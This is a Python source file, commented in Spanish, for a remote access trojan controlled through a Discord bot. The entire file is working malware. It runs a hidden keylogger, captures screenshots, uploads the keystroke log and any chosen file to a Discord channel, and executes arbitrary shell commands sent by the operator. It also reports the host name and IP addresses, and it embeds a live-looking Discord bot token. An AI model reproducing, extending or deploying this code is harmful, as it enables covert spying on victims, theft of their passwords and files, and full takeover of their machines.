import discord
import requests
import subprocess
import socket
import os
import time
import threading
import io
import zipfile
import tempfile
from PIL import ImageGrab
from pynput import keyboard

# ================= CONFIGURACION =================
DISCORD_BOT_TOKEN = "MTU1NTQzNTg0Mzk5OTYzMzQzOA.Guoo-w.dCktWO-OMT5VNZkH-WkFpllja9HEZ-Rjw1ohc8"
DISCORD_CHANNEL_ID = 1419501284322447398  # ID del canal de texto
# =================================================

# --- UTILIDADES ---
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def get_public_ip():
    try:
        return requests.get("https://api64.ipify.org?format=json", timeout=5).json()['ip']
    except:
        return "Desconocida"

CLIENT_ID = f"{socket.gethostname()} | {get_local_ip()}"
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")

# --- VARIABLES GLOBALES ---
selected = False

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# --- KEYLOGGER ---
# Teclas especiales que se IGNORAN completamente
IGNORED_KEYS = {
    keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
    keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
    keyboard.Key.caps_lock,
    keyboard.Key.esc,
    keyboard.Key.tab,
    keyboard.Key.delete,
    keyboard.Key.insert,
    keyboard.Key.home, keyboard.Key.end,
    keyboard.Key.page_up, keyboard.Key.page_down,
    keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,
    keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4,
    keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8,
    keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12,
    keyboard.Key.num_lock, keyboard.Key.scroll_lock,
    keyboard.Key.print_screen, keyboard.Key.pause,
    keyboard.Key.menu,
}

# Caracteres de control que se IGNORAN (atajos de teclado)
IGNORED_CHARS = {'\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07',
                 '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e',
                 '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15',
                 '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c',
                 '\x1d', '\x1e', '\x1f', '\x7f'}

def on_press(key):
    """Registra solo caracteres imprimibles y espacios/enter de forma limpia."""
    try:
        # Ignorar teclas especiales
        if key in IGNORED_KEYS:
            return
        
        with open(log_file, "a", encoding="utf-8") as f:
            if hasattr(key, 'char') and key.char is not None:
                # Ignorar caracteres de control
                if key.char in IGNORED_CHARS:
                    return
                # Guardar el caracter
                f.write(key.char)
            elif key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            # Cualquier otra tecla que no tenga .char se ignora
    except Exception as e:
        print(f"[!] Error keylogger: {e}")

def start_keylogger():
    try:
        # suppress=False para no bloquear las teclas al usuario
        with keyboard.Listener(on_press=on_press, suppress=False) as listener:
            listener.join()
    except Exception as e:
        print(f"[!] Error iniciando keylogger: {e}")

# --- COMPRIMIR ---
def compress_file(input_path, output_path):
    try:
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(input_path, os.path.basename(input_path))
        return True
    except Exception as e:
        print(f"[!] Error comprimiendo: {e}")
        return False

# --- PROCESAR COMANDOS ---
async def process_command(message):
    global selected
    cmd = message.content.strip()

    # $start - Ver info del cliente
    if cmd == "$start":
        await message.channel.send(
            f"```\n"
            f"Cliente: {CLIENT_ID}\n"
            f"IP Publica: {get_public_ip()}\n"
            f"Estado: {'Seleccionado' if selected else 'No seleccionado'}\n"
            f"```"
        )

    # $select <ID> - Seleccionar este cliente
    elif cmd.startswith("$select"):
        try:
            target = cmd.split(" ", 1)[1].strip()
            if target in CLIENT_ID or CLIENT_ID in target:
                selected = True
                await message.channel.send(f"```\nCliente {CLIENT_ID} seleccionado.\n```")
            else:
                selected = False
        except IndexError:
            await message.channel.send("```\nUso: $select <ID>\n```")

    # $screenshot - Tomar captura
    elif cmd == "$screenshot" and selected:
        try:
            screenshot = ImageGrab.grab()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            temp_img = os.path.join(tempfile.gettempdir(), "screenshot.png")
            with open(temp_img, 'wb') as f:
                f.write(img_bytes.getvalue())
            await message.channel.send(
                f"```\nCaptura de {CLIENT_ID}\n```",
                file=discord.File(temp_img, "screenshot.png")
            )
            os.remove(temp_img)
        except Exception as e:
            await message.channel.send(f"```\nError en screenshot: {e}\n```")

    # $seeyou - Enviar keylog comprimido
    elif cmd == "$seeyou" and selected:
        try:
            if not os.path.exists(log_file):
                await message.channel.send("```\nNo hay archivo de keylog.\n```")
                return
            temp_zip = os.path.join(tempfile.gettempdir(), "keylog.zip")
            if compress_file(log_file, temp_zip):
                size = os.path.getsize(temp_zip)
                await message.channel.send(
                    f"```\nKeylog de {CLIENT_ID} ({size} bytes)\n```",
                    file=discord.File(temp_zip, "keylog.zip")
                )
                os.remove(temp_zip)
            else:
                await message.channel.send("```\nError comprimiendo.\n```")
        except Exception as e:
            await message.channel.send(f"```\nError en seeyou: {e}\n```")

    # $clear - Borrar el keylog
    elif cmd == "$clear" and selected:
        try:
            if os.path.exists(log_file):
                os.remove(log_file)
                await message.channel.send("```\nKeylog borrado.\n```")
            else:
                await message.channel.send("```\nNo hay archivo de keylog.\n```")
        except Exception as e:
            await message.channel.send(f"```\nError borrando keylog: {e}\n```")

    # $download <ruta> - Descargar archivo del cliente
    elif cmd.startswith("$download") and selected:
        try:
            path = cmd.split(" ", 1)[1].strip()
            if not os.path.exists(path):
                await message.channel.send(f"```\nNo existe: {path}\n```")
                return
            if os.path.isdir(path):
                await message.channel.send("```\nEs una carpeta. Especifica un archivo.\n```")
                return
            size = os.path.getsize(path)
            if size > 8 * 1024 * 1024:
                await message.channel.send(f"```\nArchivo muy grande ({size/1024/1024:.2f} MB). Limite: 8 MB.\n```")
                return
            await message.channel.send(
                f"```\nArchivo: {path}\n```",
                file=discord.File(path)
            )
        except IndexError:
            await message.channel.send("```\nUso: $download <ruta>\n```")
        except Exception as e:
            await message.channel.send(f"```\nError: {e}\n```")

    # $$ <comando> - Ejecutar cualquier comando CMD
    elif cmd.startswith("$$") and selected:
        try:
            comando_cmd = cmd[2:].strip()
            if not comando_cmd:
                await message.channel.send("```\nUso: $$ <comando>\nEjemplo: $$ dir\n```")
                return

            output = subprocess.check_output(
                comando_cmd, shell=True, stderr=subprocess.STDOUT,
                text=True, timeout=60
            )
            if not output:
                output = "[Sin salida]"
        except subprocess.CalledProcessError as e:
            output = e.output
        except subprocess.TimeoutExpired:
            output = "[Timeout: el comando tardo mas de 60 segundos]"
        except Exception as e:
            output = str(e)

        if len(output) > 1900:
            output = output[:1900] + "\n... [truncado]"

        await message.channel.send(f"```\n{CLIENT_ID}:\n{output}\n```")

# --- EVENTOS DEL BOT ---
@client.event
async def on_ready():
    print(f"[*] Bot conectado como {client.user}")
    print(f"[*] Cliente: {CLIENT_ID}")
    print(f"[*] Keylog en: {log_file}")
    channel = client.get_channel(DISCORD_CHANNEL_ID)
    if channel:
        await channel.send(f"```\nCliente conectado: {CLIENT_ID}\n```")

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.channel.id != DISCORD_CHANNEL_ID:
        return
    await process_command(message)

# --- INICIO ---
if __name__ == "__main__":
    print(f"[*] Cliente iniciado: {CLIENT_ID}")

    # Iniciar keylogger
    threading.Thread(target=start_keylogger, daemon=True).start()
    print("[*] Keylogger iniciado.")

    # Iniciar bot de Discord
    print("[*] Iniciando bot de Discord...")
    client.run(DISCORD_BOT_TOKEN)